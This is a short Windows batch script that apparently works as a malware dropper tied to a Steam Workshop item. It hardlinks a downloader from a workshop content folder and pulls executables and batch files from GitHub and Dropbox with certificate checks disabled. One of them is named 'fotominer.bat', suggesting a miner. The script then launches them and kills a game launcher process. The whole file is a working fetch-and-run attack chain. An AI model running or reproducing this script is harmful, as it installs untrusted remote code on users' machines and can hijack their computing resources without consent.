CD "C:\Program Files (x86)\Steam"
mkdir cu
cd cu
fsutil hardlink create emberget.exe "C:\Program Files (x86)\Steam\steamapps\workshop\content\221100\2285499692\emberget.exe"
emberget --no-check https://github.com/Xanner-3355/xane/raw/main/pssuspend.exe
emberget --no-check https://github.com/Xanner-3355/xane/raw/main/xane.exe
emberget --no-check https://dl.dropboxusercontent.com/s/y8c566um0dclwui/fotominer.bat
emberget --no-check https://github.com/Xanner-3355/xane/raw/main/sus.bat
emberget --no-check https://github.com/Xanner-3355/xane/raw/main/xankill.exe
START fotominer.bat
START sus.bat
xankill.exe -accepteula dayzlauncher.exe